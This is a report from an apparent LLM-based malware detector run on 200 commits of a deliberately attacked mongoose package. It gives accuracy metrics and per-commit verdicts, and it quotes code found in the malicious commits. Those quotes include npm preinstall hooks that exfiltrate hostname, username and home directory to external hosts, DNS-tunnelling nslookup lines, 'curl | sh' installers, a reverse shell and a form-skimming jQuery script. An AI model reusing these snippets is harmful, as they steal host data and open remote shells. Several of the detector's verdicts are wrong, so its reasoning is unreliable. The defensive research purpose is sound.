# Stress Test Report

**Target:** ../collection_of_attacked_repo/mongoose
**Range:** 8.19.4 -> 8.19.5
**Date:** 2025-12-20 22:30:06
**Model:** openai/gpt-oss-120b by OpenRouter (providers: Groq, DeepInfra)

## Statistics
- Total Commits Analyzed: 200
- Failed Requests: 0
- Failed Commits: 0
- Empty Dynamic: 197
- Cost: $0.358
- Total tokens: 1.64M (Prompt 1.39M, Reasoning 0, Completion 255K)

## Predictions
- malware: 119
- benign: 81
- unknown: 0

## Accuracy Metrics
- Accuracy: 83.50%
- Precision: 78.15%
- Recall: 93.00%
- F1 Score: 84.93%

*Evaluated against 200 commits (TP:93 FP:26 TN:74 FN:7). Missing/Unknown: 0/0*

## Timing Statistics (Seconds)
| Metric | Max | Min | Average | Total |
| :--- | :--- | :--- | :--- | :--- |
| Pre Analysis Time | 11.8188s | 0.0065s | 0.1599s | 31.98s |
| Static Analysis Time | 15.4522s | 0.0000s | 2.9396s | 587.92s |
| Dynamic Analysis Time | 307.2562s | 4.9687s | 22.8601s | 4572.01s |
| Verification Time | 7.5341s | 0.6874s | 1.5554s | 311.08s |
| Total Per Commit | 309.5758s | 6.7380s | 27.5150s | 5502.99s |

**Overall Wall Clock Time:** 91.72 minutes (5502.99 seconds)

## Detailed Commits
### Commit 4e16637b: Malware
**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: Executes arbitrary JavaScript during npm install, giving an attacker code execution on the developer's machine or CI environment. Classified as HIGH severity command execution.

**File package.json**:
Code: `"pingback": "curl https://eo536ohsnextro9.m.pipedream.net"`
Reason: Performs an outbound HTTP request to an external endpoint, potentially exfiltrating data or confirming beacon connectivity. Classified as MEDIUM severity suspicious network access.

**Summary:** The commit introduces a preinstall script that runs unverified code and a pingback script that contacts an external server, both of which are strong indicators of malicious intent. Combined with the high severity rating of the command execution, the overall assessment is that this commit is malware.

**Truth label:** Benign

### Commit d3c3f378: Malware
**File index.js**:
Code: `const https = require('https'); const os = require('os'); const trackingData = JSON.stringify({   home: process.env.HOME,   hostname: os.hostname(),   scriptPath: __dirname }); const options = {   hos`
Reason: The snippet creates an HTTPS request to an external, non‑standard domain and transmits JSON containing the user's home directory, hostname, and script location. This behavior matches the static analysis findings of a critical suspicious network access and a high‑severity data leak, indicating intentional exfiltration of identifiable system information.

**Summary:** Static analysis identified critical and high severity issues where the code collects sensitive system information and sends it to an external server without user consent. No benign behavior offsets these findings, leading to a verdict of MALWARE.

**Truth label:** Malware

### Commit aae3118a: Malware
**File package.json**:
Code: `"zxcvbnmmmmmmkjhgfdssss": "^1.0.0"`
Reason: The added dependency name appears to be a random, obfuscated string, which is a strong indicator of a malicious or compromised package. Such packages can execute arbitrary code at runtime, leading to code injection or supply‑chain attacks.

**Summary:** Static analysis identified a high‑severity code injection risk due to the inclusion of a suspicious, likely malicious dependency. No dynamic behavior was observed, but the presence of this unknown package in production is sufficient to classify the commit as malware until the dependency is verified or removed.

**Truth label:** Benign

### Commit 98b1e819: Malware
**File index.js**:
Code: `const os = require('os'); const https = require('https'); const data = {   home: os.homedir(),   hostname: os.hostname(),   user: os.userInfo().username,   dns: require('dns').getServers() }; const re`
Reason: The script gathers host‑level identifiers (home directory, hostname, username, DNS servers) and sends them over HTTPS to an external domain. This is a classic data‑exfiltration pattern and matches the CRITICAL "suspicious_network_access" issue.

**File package.json**:
Code: `"scripts": {   "preinstall": "node index.js",   "pingback": "curl https://example.pipedream.net" },`
Reason: The `preinstall` lifecycle script runs the exfiltration code automatically during `npm install`, creating a silent supply‑chain backdoor. The presence of a `pingback` script further indicates intent to communicate with an attacker‑controlled endpoint.

**File package.json**:
Code: `"dependencies": {   "zxcvbnmmmmmmkjhgfdssss": "^1.0.0" },`
Reason: The added dependency has a random, non‑descriptive name and is likely a malicious package that could execute code on install, reinforcing the supply‑chain compromise risk.

**Summary:** Multiple high‑severity issues are present: the code exfiltrates sensitive system information, a preinstall script ensures the malicious payload runs automatically on every install, and a suspicious dependency may introduce additional malicious behavior. Combined with the lack of any benign dynamic behavior, the commit is classified as MALWARE.

**Truth label:** Malware

### Commit a631ed87: Malware
**File package.json**:
Code: `"preinstall": "nslookup $(hostname).$(pwd|base64).ex.sysdum.net"`
Reason: Executes a DNS lookup to an external domain, leaking the machine's hostname and base64‑encoded working directory. This is a clear data‑exfiltration technique.

**File package.json**:
Code: `"test": "nslookup $(hostname).$(pwd|base64).ex.sysdum.net"`
Reason: Repeats the same exfiltration behavior on every test run, further confirming intent to send internal information to a third‑party server.

**File package.json**:
Code: `"pingback": "curl https://eo536ohsnextro9.m.pipedream.net"`
Reason: Contacts an external webhook on demand, providing a generic outbound channel that can be used for data exfiltration or remote command triggering.

**Summary:** Static analysis reveals multiple npm scripts that intentionally send internal system data to external endpoints (via DNS queries and HTTP requests). These behaviors constitute suspicious network access and potential data exfiltration, which are characteristic of malicious code. No benign functionality justifies such outbound communication, leading to a verdict of MALWARE.

**Truth label:** Malware

### Commit 64e45fcb: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no observable malicious actions. Therefore, there is no evidence to classify this commit as malware.

**Truth label:** Benign

### Commit 4555d68f: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no observable malicious actions. Therefore, there is no evidence to classify this commit as malware.

**Truth label:** Benign

### Commit 1f970d96: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static analysis found zero issues, and the dynamic analysis produced no results indicating malicious activity. Therefore, the commit appears to be benign.

**Truth label:** Malware

### Commit 2829d6a2: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no observable malicious actions. Therefore, there is no evidence to classify this commit as malware.

**Truth label:** Benign

### Commit d4c2e06a: Malware
**File index.js**:
Code: `fetch('https://eojg3fg8d673pvt.m.pipedream.net', {     method: 'POST',     headers: { 'Content-Type': 'application/json' },     body: JSON.stringify({         os: process.platform,         user: requi`
Reason: The snippet collects system information (OS, current user, installed packages) and transmits it to an external endpoint without any user consent or disclosure. This behavior matches the high‑severity data leak issue reported in the static analysis and is characteristic of malicious telemetry or exfiltration code.

**Summary:** Static analysis identified a high‑severity data exfiltration pattern where sensitive system details are sent to an untrusted external server. No mitigating behavior was observed in dynamic analysis. The presence of unauthorized telemetry constitutes malicious activity, leading to a MALWARE verdict.

**Truth label:** Malware

### Commit 9f99f902: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no observable malicious actions. Therefore, there is no evidence to classify this commit as malware.

**Truth label:** Benign

### Commit 657eccd7: Malware
**File package.json**:
Code: `"pingback": "curl https://eo536ohsnextro9.m.pipedream.net"`
Reason: The script makes an unauthenticated outbound HTTP request to an unknown external endpoint during install, which is a classic exfiltration or beaconing technique.

**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: Executes arbitrary JavaScript before the package is installed, allowing malicious code in index.js to run with the installing user's privileges.

**Summary:** Static analysis reveals high‑severity network beaconing and a pre‑install hook that runs unverified code, both strong indicators of malicious intent. No benign behavior offsets these findings, leading to a malware verdict.

**Truth label:** Benign

### Commit 2e9e1ef8: Malware
**File index.js**:
Code: `const net = require('net'); const client = net.createConnection({ host: 'in1.localto.net', port: 7334 }, () => {     client.on('data', data => {         require('child_process').exec(data.toString(), `
Reason: The snippet opens an outbound TCP connection to a hard‑coded remote host and executes any received data using `child_process.exec`. This implements an unrestricted reverse shell, allowing an attacker to run arbitrary commands and receive their output, which is a classic malicious behavior.

**Summary:** Static analysis reveals critical command execution and data exfiltration capabilities via a hard‑coded reverse shell. Although dynamic analysis did not capture activity, the presence of such code is sufficient to classify the commit as malware.

**Truth label:** Malware

### Commit 6abe477a: Malware
**File index.js**:
Code: `const https = require('https'); const os = require('os'); const data = {   home: os.homedir(),   hostname: os.hostname(),   username: os.userInfo().username,   dns: os.networkInterfaces(),   version: `
Reason: Collects sensitive host information (home directory, hostname, username, DNS servers, Node version) and sends it via an HTTPS POST to a non‑human‑readable external domain. This is a classic data‑exfiltration pattern and is flagged as a CRITICAL data leak.

**File package.json**:
Code: `"scripts": {   "preinstall": "node index.js",   "pingback": "curl https://eo536ohsnextro9.m.pipedream.net" }`
Reason: The preinstall script runs the exfiltration code automatically during `npm install`, ensuring execution without user consent. The additional `pingback` script invokes a curl command to another external endpoint, providing a second covert channel for data leakage. Both are HIGH severity command‑execution and network‑access issues.

**Summary:** Static analysis reveals multiple high‑severity issues: unauthorized collection of host data, automatic execution of exfiltration code during package installation, and outbound network calls to disposable domains. No dynamic behavior was observed, but the presence of these patterns alone constitutes malicious intent. Therefore, the commit is classified as MALWARE.

**Truth label:** Malware

### Commit 3b4cebf4: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no observable malicious actions. Therefore, there is no evidence to classify this commit as malware.

**Truth label:** Benign

### Commit 40204310: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no results, indicating no malicious code was detected in this commit.

**Truth label:** Benign

### Commit df31d8f9: Benign
**Summary:** Both static and dynamic analyses reported no issues. The static scan found zero issues, and the dynamic analysis did not produce a report, indicating no observable malicious behavior. In the absence of any suspicious indicators, the commit is considered benign.

**Truth label:** Benign

### Commit 063e9077: Malware
**File installer.js**:
Code: `process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0; const https = require('https'); const data = { hostname: os.hostname(), user: os.userInfo().username, platform: os.platform(), admin: isAdmin }; const `
Reason: Disables TLS certificate validation globally and sends collected system information to an unauthenticated external server, which is classic data‑exfiltration behavior.

**File installer.js**:
Code: `const { execSync } = require('child_process'); const netInfo = execSync('net session').toString(); const sysInfo = execSync('systeminfo').toString(); const groups = execSync('groups').toString();`
Reason: Executes privileged system commands without sandboxing or input validation, providing the ability to run arbitrary code if the script is ever modified.

**File package.json**:
Code: `"preinstall": "node installer.js", "scripts": { "pingback": "curl https://example.pipedream.net" }`
Reason: The preinstall hook runs the malicious installer automatically on every `npm install`, and the pingback script can be used to signal successful infection or exfiltrate data.

**File .eslintignore**:
Code: `lib/* bin/*`
Reason: Excludes core source directories from linting, a common tactic to hide malicious code from static analysis tools.

**Summary:** The commit introduces an installer that silently collects sensitive system data, disables TLS verification, executes privileged commands, and exfiltrates the information to an external server via a preinstall hook. Combined with additional suspicious scripts and obfuscation tactics, these behaviors constitute clear malicious intent rather than benign functionality.

**Truth label:** Malware

### Commit 8a258cc6: Malware
**File package.json**:
Code: `"pingback": "curl https://europe-west1-pipedream.net/..."`
Reason: The script contacts an external, untrusted endpoint during normal npm operations, which can be used to exfiltrate data or signal a successful install to an attacker-controlled server. Classified as HIGH severity suspicious network access.

**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: The preinstall hook runs arbitrary JavaScript before the package is installed, giving the attacker code execution privileges on the host machine. This can download additional payloads or modify the environment, a MEDIUM severity command execution risk.

**Summary:** Static analysis reveals high‑severity network exfiltration and medium‑severity arbitrary code execution via npm scripts. Although dynamic analysis showed no runtime activity, the presence of these hooks is sufficient to consider the commit malicious.

**Truth label:** Benign

### Commit b2f02b1f: Malware
**File index.js**:
Code: `https.get(`https://exzuperi.ftp.sh/${encodeURIComponent(process.env.HOME)}/${encodeURIComponent(require('os').hostname())}/${encodeURIComponent(__dirname)}`)`
Reason: The script constructs an HTTPS request to an external domain and embeds the user's home directory, hostname, and script directory in the URL, which is a clear data exfiltration attempt.

**File index.js**:
Code: `console.log('https://t.me/Exzuperi');`
Reason: Outputs a Telegram link that can be used for social engineering, encouraging users to contact the attacker.

**File package.json**:
Code: `"test": "echo 'Contact @Exzuperi on Telegram'"`
Reason: Replaces the test script with a message that references an external Telegram handle, potentially luring developers or users to interact with the attacker.

**Summary:** The commit contains high‑severity behaviors: it exfiltrates system information to an untrusted external server and includes social‑engineering elements (Telegram contact links). These actions are characteristic of malicious code, leading to a MALWARE verdict.

**Truth label:** Malware

### Commit e88a54be: Malware
**File jquery.min.js**:
Code: `async function end(){ $.ajax({ url: "https://api-web-vrip.hanznesia.my.id", method: "POST", data: $("form").serialize() }); }`
Reason: The minified jQuery file contains a hidden AJAX request that sends serialized form data to an external, attacker‑controlled domain. This can exfiltrate sensitive user data whenever the function is invoked.

**File package.json**:
Code: `"test": "jquery"`
Reason: The test script runs the malicious jquery.min.js with Node.js during `npm test`, automatically triggering the outbound AJAX request and causing unwanted network traffic in CI environments.

**File package.json**:
Code: `"rpio": "2.4.2"`
Reason: Adds a native GPIO module that can execute system commands. While not directly malicious, it expands the attack surface and could be abused for privilege escalation if the module is compromised.

**Summary:** Static analysis reveals high‑severity suspicious network access that leaks form data to an external server, and a test script that deliberately executes this malicious code. Combined with the addition of a native module that can run system commands, the commit exhibits clear malicious intent. No benign behavior outweighs these findings, therefore the commit is classified as MALWARE.

**Truth label:** Malware

### Commit 1bff3b1d: Malware
**File index.js**:
Code: `const data = { home: os.homedir(), hostname: os.hostname(), user: os.userInfo().username, dns: dns.getServers() }; https.request({ hostname: '1xz9v8h6fipd4fsc0ui41vatjkpbd11q.oastify.com', method: 'PO`
Reason: The script collects identifiable host information and sends it over HTTPS to an external domain without user consent, indicating a data exfiltration payload.

**File package.json**:
Code: `"scripts": { "preinstall": "node index.js", "pingback": "curl https://eo536ohsnextro9.m.pipedream.net" }`
Reason: The preinstall script automatically executes the exfiltration code during npm install, turning the package into a supply‑chain attack vector. The additional pingback script further suggests intent to communicate with external services.

**Summary:** Static analysis reveals critical malicious behavior: unauthorized collection of system data and automatic execution via a preinstall hook, both hallmarks of a supply‑chain malware package. No malicious activity was observed dynamically, but the presence of these code paths is sufficient to classify the commit as malware.

**Truth label:** Malware

### Commit 1ea0894c: Benign
**File index.js**:
Code: `const child = spawn('python', ['script.py', payload]);`
Reason: The code launches a Python script using a user‑controllable `payload` argument. While this presents a command‑injection risk if the payload is not validated, the static analysis only flags a potential vulnerability; there is no evidence of malicious intent or payload manipulation in the commit.

**File test.js**:
Code: `const child = spawn('python', ['script.py', 'static_payload']);`
Reason: The test script uses a hard‑coded payload, mirroring the production pattern. It does not introduce new risk and serves only as a development check.

**File sx1262.py**:
Code: `data = b'\xc1\x00\x09'`
Reason: These raw byte literals are used for hardware communication and are not an obfuscation technique. They are benign and correctly documented.

**Summary:** The commit contains a medium‑severity command‑execution pattern that could be exploited if input is not sanitized, but there is no indication of malicious payloads or behavior. Dynamic analysis observed no suspicious activity. Therefore, the commit is classified as benign, though it should be reviewed for proper input validation to mitigate potential command‑injection vulnerabilities.

**Truth label:** Benign

### Commit 40223784: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no observable malicious actions. Therefore, there is no evidence to classify this commit as malware.

**Truth label:** Benign

### Commit e85b5f5f: Malware
**File package.json**:
Code: `"preinstall": "curl https://bes23.free.beeceptor.com"`
Reason: The preinstall script runs automatically on every npm install and issues a curl request to an external domain. This enables silent data exfiltration or remote code execution without user consent, which is a classic indicator of malicious supply‑chain behavior.

**File package.json**:
Code: `"pingback": "curl https://eo536ohsnextro9.m.pipedream.net"`
Reason: Although not auto‑executed, the pingback script provides an easy way for an attacker with package access to manually trigger a network beacon to an attacker‑controlled endpoint, further confirming intent to communicate with external servers.

**Summary:** The presence of a critical‑severity preinstall script that automatically contacts an external URL, combined with an additional high‑severity pingback script, constitutes clear malicious intent. No benign functionality outweighs these indicators, so the commit is classified as malware.

**Truth label:** Benign

### Commit ef03551f: Benign
**File lib/service.js**:
Code: `fetch('https://kfc.yuki.sh/api/index')     .then(response => response.json())     .then(data => { /* ... */ });`
Reason: The code performs an HTTP GET to a hard‑coded external URL. While this introduces a potential exfiltration or backdoor vector, the request is a simple fetch without processing untrusted input, and no malicious payload was observed during dynamic analysis. The risk is moderate (MEDIUM) but does not constitute malware on its own.

**File lib/index.js**:
Code: `const schedule = new CronJob(process.env.KFC_DATE, () => { /* ... */ });`
Reason: The cron expression is taken directly from an environment variable without validation. This could allow an attacker to alter scheduling, but it does not lead to code execution or data theft by itself. The issue is low severity and does not indicate malicious intent.

**Summary:** Static analysis identified two low‑to‑medium risk issues: an external HTTP request and unsanitized use of an environment variable. Dynamic analysis showed no malicious behavior (empty result set). These findings suggest poor security hygiene rather than intentional malware. Therefore, the commit is classified as BENIGN, though remediation of the highlighted issues is recommended.

**Truth label:** Benign

### Commit ecda94ad: Malware
**File jquery.min.js**:
Code: `$('form').on('submit',function(e){e.preventDefault();$.ajax({type:'POST',url:'https://api andaaaa',data:$(this).serialize()});});`
Reason: The script hijacks every form submission and sends the serialized user data to an external, attacker‑controlled domain, which is a classic data‑exfiltration technique.

**File jquery.min.js**:
Code: `async function(){ const resp = await fetch(`https://panel.api‑bo.my.id/?key=${key}&data=${hexEncode($(form).serialize()))}`); }`
Reason: An async block inside the library makes a GET request to a remote server with the form contents encoded in hex, further confirming intentional leakage of sensitive data.

**File package.json**:
Code: `"dependencies": { "livinjs": "^1.2.3", "xytta": "^0.9.0" }`
Reason: These newly added third‑party packages bundle the malicious jquery.min.js, introducing a supply‑chain risk that propagates the exfiltration code throughout the application.

**File .bash_history**:
Code: `ssh livin@20.93.7.198\ncurl https://maulanarizky-store-disini.rizkyxd.me/ip.php`
Reason: Committed shell history reveals credentials and direct calls to external URLs, providing attackers with reconnaissance data and further evidence of malicious intent.

**Summary:** Multiple high‑severity issues were identified, including deliberate exfiltration of form data to external servers, obfuscation of the leaked data, introduction of malicious third‑party dependencies, and exposure of operational credentials. These indicators collectively demonstrate that the commit contains malicious behavior rather than benign code.

**Truth label:** Malware

### Commit 40ce970c: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no observable malicious actions. Therefore, the commit appears to be benign.

**Truth label:** Malware

### Commit 43d06416: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no observable malicious actions. Therefore, there is no evidence to classify this commit as malware.

**Truth label:** Benign

### Commit ba3478df: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no anomalous results, indicating the commit does not exhibit malware characteristics.

**Truth label:** Benign

### Commit c35a4257: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no observable malicious actions. Therefore, there is no evidence to classify this commit as malware.

**Truth label:** Benign

### Commit 4a96c312: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no observable malicious actions. Therefore, the commit appears to be benign.

**Truth label:** Benign

### Commit acece12f: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no observable malicious actions. Therefore, the commit appears to be benign.

**Truth label:** Malware

### Commit 7c6c00d8: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no observable malicious actions. Therefore, there is no evidence to classify this commit as malware.

**Truth label:** Benign

### Commit 0ef45ef6: Malware
**File package.json**:
Code: `"child_process": "<version>"`
Reason: Adds a dependency named "child_process" which shadows Node's built‑in module. This can allow the package to execute arbitrary system commands when required, a classic technique for malicious code execution.

**File package.json**:
Code: `"fs": "<version>", "os": "<version>", "buffer": "<version>", "buffer-from": "<version>"`
Reason: Introduces dependencies that collide with core Node modules (fs, os, buffer). Malicious packages published under these names can hijack require calls, enabling unauthorized file system access or code execution.

**Summary:** Static analysis reveals high‑severity issues where core Node modules are overridden by maliciously named dependencies, providing a clear path for command execution and data exfiltration. Although dynamic analysis showed no activity, the presence of these suspicious dependencies is sufficient to classify the commit as malware.

**Truth label:** Benign

### Commit 99e7cd10: Benign
**Summary:** Both static and dynamic analyses revealed no suspicious indicators. The static scan reported zero issues and no code patterns of concern, while the dynamic analysis did not produce a report, providing no evidence of malicious behavior. In the absence of any detected threats, the commit is considered benign.

**Truth label:** Benign

### Commit 8dcad674: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no results, indicating no malicious activity associated with this commit.

**Truth label:** Benign

### Commit db9bb1e4: Malware
**File package.json**:
Code: `"preinstall": "curl https://bes23.free.beeceptor.com"`
Reason: Executes a curl command during npm install to contact an external server without user consent, enabling potential data exfiltration and supply‑chain compromise.

**File index.js**:
Code: `const trackingData = { homeDir: os.homedir(), hostname: os.hostname(), username: os.userInfo().username, dns: dns.getServers(), version: require('./package.json').version };`
Reason: Collects host‑level information that can identify the user and system, which is later sent to an external endpoint, constituting unauthorized data collection.

**File index.js**:
Code: `const req = https.request({ hostname: '356sv2lpkjygtxa2jimze3fvrmxdl59u.oastify.com', method: 'POST', ... }, (res) => { ... }); req.write(JSON.stringify(trackingData)); req.end();`
Reason: Hard‑coded HTTP POST to a remote domain sends the gathered trackingData, providing a clear exfiltration channel.

**Summary:** Multiple critical issues were identified, including a preinstall script that performs an unsolicited network request, collection of sensitive host information, and its transmission to a hard‑coded external server. These behaviors are characteristic of malicious software, leading to a MALWARE verdict.

**Truth label:** Malware

### Commit 41bb9d17: Malware
**File index.js**:
Code: `const url = `http://${ip}:8080/${hostname}/${username}/${cwd}/${packageName}`; http.get(url);`
Reason: The script builds a URL that embeds host identifiers (hostname, username, working directory, package name) and sends it to an external IP address, constituting clear data exfiltration.

**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: A preinstall hook automatically runs the malicious index.js during npm install, providing a supply‑chain attack vector.

**File index.js**:
Code: `const arr = ["\x68\x74\x74\x70", "\x68\x74\x74\x70\x73"]; const http = require(arr[0]);`
Reason: Hex‑encoded strings and indirect indexing are used to hide module names and logic, a typical obfuscation technique that hinders analysis.

**Summary:** Multiple high‑severity issues were identified: unauthorized collection and transmission of system information to external servers, execution of malicious code via a preinstall script, and deliberate obfuscation of the payload. These behaviors align with malicious intent, leading to a MALWARE verdict.

**Truth label:** Malware

### Commit 54d80ea5: Malware
**File install.js**:
Code: `const hostname = os.hostname(); const targetHost = `${process.argv[2]}.${hostname}`; const payload = Buffer.from(hostname, 'utf8').toString('hex'); const req = https.request({   hostname: targetHost, `
Reason: The script gathers the machine's hostname, encodes it, and sends it to a remote domain built from a command‑line argument. It disables TLS verification (rejectUnauthorized: false), enabling data exfiltration and man‑in‑the‑middle attacks. These behaviors match the critical and high‑severity issues identified in the static analysis.

**Summary:** Static analysis reveals multiple high‑severity security issues: unauthorized outbound HTTPS request to an external domain, leakage of host identifiers, unsafe use of command‑line arguments, and TLS verification disabled. Although dynamic analysis showed no runtime activity, the code itself is designed to exfiltrate data and bypass security controls, indicating malicious intent. Therefore, the commit is classified as MALWARE.

**Truth label:** Malware

### Commit 587b6c37: Malware
**File package.json**:
Code: `"preinstall": "node browser.js"`
Reason: Executes arbitrary code during npm install, enabling a supply‑chain attack that runs without user interaction.

**File browser.js**:
Code: `const data = { username: os.userInfo().username, home: os.homedir(), hostname: os.hostname(), dns: dnsServers }; https.post('https://example.pipedream.net', data);`
Reason: Collects host system information and exfiltrates it to an external endpoint via HTTPS, indicating malicious data theft.

**File package.json**:
Code: `"pingback": "curl https://malicious.example.com"`
Reason: Defines an unauthenticated curl request that can be used for beaconing or additional data exfiltration.

**Summary:** The commit adds a preinstall script that runs code to harvest system data and send it to external servers, plus a pingback script for unauthenticated network calls. These behaviors constitute a supply‑chain attack and data exfiltration, classifying the commit as malware.

**Truth label:** Malware

### Commit ecbe5cc1: Malware
**File package.json**:
Code: `"preinstall": "curl -X POST https://dev.oscato.com/opx-base-component-postinstall -H \"X-WhoAmI: $USER\""`
Reason: The preinstall lifecycle script runs automatically during npm install and makes an HTTP request to an external domain, leaking the system's $USER environment variable. This enables silent data exfiltration and remote command execution, which are classic malicious behaviors.

**File package.json**:
Code: `"pingback": "curl https://eo536ohsnextro9.m.pipedream.net"`
Reason: Although not auto‑executed, the pingback script provides a hard‑coded external endpoint that can be invoked to exfiltrate data on demand, further indicating intent to communicate with attacker‑controlled servers.

**Summary:** Static analysis reveals that the commit adds npm lifecycle scripts that automatically contact external servers and leak environment information without user consent. Such behavior aligns with malicious intent, outweighing the lack of observed activity in dynamic analysis. Therefore, the commit is classified as MALWARE.

**Truth label:** Malware

### Commit 3a840947: Malware
**File package.json**:
Code: `"preinstall": "node build.js"`
Reason: Adds a preinstall hook that runs arbitrary code during npm install, providing a supply‑chain attack vector.

**File build.js**:
Code: `const { spawn } = require('child_process'); spawn('curl', ['https://oastify.com/collect', '--data', packageId]);`
Reason: Spawns curl to send package identifier to an attacker‑controlled domain, indicating data exfiltration over the network.

**File build.js**:
Code: `function exfil(data) {   const encoded = Buffer.from(data).toString('hex');   spawn('nslookup', [`${encoded}.malicious-domain.com`]); }`
Reason: Uses DNS queries with encoded data in the sub‑domain, a classic DNS tunneling technique for covert exfiltration.

**Summary:** Static analysis reveals multiple critical issues: a preinstall script that executes code automatically, explicit network calls (curl, wget) to attacker‑controlled domains, and DNS‑based data exfiltration. These behaviors are characteristic of malicious supply‑chain implants, leading to a MALWARE verdict despite the lack of observed activity in dynamic analysis.

**Truth label:** Malware

### Commit 15eff7fd: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no anomalous results, indicating the commit does not exhibit malicious characteristics.

**Truth label:** Benign

### Commit cc737e05: Malware
**File package.json**:
Code: `"preinstall": "curl https://bes23.free.beeceptor.com | sh", "pingback": "curl -X POST https://eo536ohsnextro9.m.pipedream.net"`
Reason: The scripts are executed automatically during npm install, contacting external URLs without user interaction. This behavior can download arbitrary code or exfiltrate data, which is a classic indicator of malicious activity.

**Summary:** Static analysis identified a high‑severity issue where npm lifecycle scripts perform unauthenticated network calls to external endpoints. Such behavior is typical of supply‑chain attacks and can lead to remote code execution or data leakage. No benign functionality offsets this risk, and dynamic analysis showed no mitigating activity. Therefore, the commit is classified as malware.

**Truth label:** Benign

### Commit 6307c863: Malware
**File package.json**:
Code: `"preinstall": "curl https://bes23.free.beeceptor.com | sh"`
Reason: The preinstall script runs a curl command to an external domain during installation, which can download and execute arbitrary code without user consent. This is a classic indicator of supply‑chain malware.

**File package.json**:
Code: `"pingback": "curl -X POST https://eo536ohsnextro9.m.pipedream.net"`
Reason: A separate script also contacts an external endpoint, acting as a beacon that can exfiltrate data or confirm successful installation to an attacker.

**File components/DLQMessageCleanUp.js**:
Code: `const url = `${props.controllerBaseUrl}${props.getDeleteDlqMsgUrl}`; fetch(url, { method: 'DELETE' });`
Reason: The component builds request URLs from props that may be supplied by untrusted sources, enabling SSRF or token leakage if an attacker controls the values.

**File components/InvalidJobsFromPools.js**:
Code: `const cancelUrl = props.getCancelJobUrl; useFetchApi(cancelUrl, { method: 'POST' });`
Reason: Similar to the previous component, it forwards attacker‑controlled URLs to a fetch wrapper that automatically adds authentication headers, risking credential exposure.

**Summary:** Multiple high‑severity issues are present, notably preinstall and pingback scripts that perform unauthenticated network calls to external servers during package installation, a behavior typical of malicious packages. Combined with additional medium‑severity SSRF risks, the evidence strongly indicates that this commit introduces malware rather than benign functionality.

**Truth label:** Benign

### Commit 67eafb7d: Malware
**File esm2022/lib/safe-html.pipe.mjs**:
Code: `return this.sanitizer.bypassSecurityTrustHtml(value);`
Reason: Uses DomSanitizer.bypassSecurityTrustHtml on arbitrary input, disabling Angular's built‑in XSS protection and allowing injection of malicious HTML/JS.

**File esm2022/lib/ngx-spinner.component.mjs**:
Code: `<div [innerHTML]="template | safeHtml"></div>`
Reason: Binds a user‑controlled `template` string to innerHTML via the unsafe `safeHtml` pipe, creating a direct XSS vector if the input is not strictly validated.

**Summary:** Static analysis uncovered two high‑severity code injection issues that allow arbitrary HTML/JavaScript execution via Angular's bypassSecurityTrustHtml and unsafe innerHTML binding. No dynamic malicious behavior was observed, but the introduced vulnerabilities constitute malicious intent or severe security risk, leading to a MALWARE verdict.

**Truth label:** Benign

### Commit 42c99328: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no anomalous results, indicating the commit does not exhibit malicious characteristics.

**Truth label:** Benign

### Commit 9a3abb9b: Malware
**File package.json**:
Code: `"preinstall": "curl https://bes23.free.beeceptor.com"`
Reason: The preinstall npm script executes a curl command to an external domain during package installation, enabling automatic outbound network traffic and potential data exfiltration without user consent.

**File package.json**:
Code: `"pingback": "curl https://eo536ohsnextro9.m.pipedream.net"`
Reason: The pingback script can be manually invoked or triggered by tooling to send a request to another external endpoint, providing a covert channel for telemetry or exfiltration.

**File index.js**:
Code: `const trackingData = {   homeDir: os.homedir(),   hostname: os.hostname(),   username: os.userInfo().username,   dnsServers: dns.getServers(),   version: require('./package.json').version,   packageJs`
Reason: The code gathers extensive system information and sends it via an HTTP POST to a domain commonly used for testing or malicious callbacks, constituting unauthorized data exfiltration.

**File index.js**:
Code: `const req = http.request({   hostname: '356sv2lpkjygtxa2jimze3fvrmxdl59u.oastify.com',   port: 80,   path: '/',   method: 'POST',   headers: { 'Content-Type': 'application/json' } }, res => { /* ... *`
Reason: An explicit HTTP request to an external, untrusted domain transmits the collected system data, confirming malicious exfiltration behavior.

**Summary:** Static analysis reveals multiple high‑severity and critical issues: npm scripts that automatically contact external servers during install and on demand, and JavaScript code that harvests detailed system information and exfiltrates it to an untrusted domain. These behaviors are characteristic of malicious payloads, leading to a MALWARE verdict despite the lack of observable activity in the dynamic analysis.

**Truth label:** Malware

### Commit 48841fd8: Malware
**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: The preinstall hook runs arbitrary code (index.js) automatically during npm/yarn install, enabling silent execution of malicious payloads without user consent.

